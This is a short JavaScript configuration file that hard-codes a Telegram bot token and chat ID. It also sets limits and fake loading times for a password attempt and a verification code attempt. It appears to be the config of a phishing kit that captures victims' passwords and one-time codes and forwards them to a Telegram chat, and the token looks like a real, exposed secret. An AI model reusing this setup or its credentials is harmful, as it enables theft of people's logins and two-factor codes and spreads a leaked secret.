const config = {
    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA',
    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '7211586401',
    MAX_PASS: 2,
    MAX_CODE: 4,
    PASSWORD_LOADING_TIME: 6,
    CODE_LOADING_TIME: 15
};

export default config;
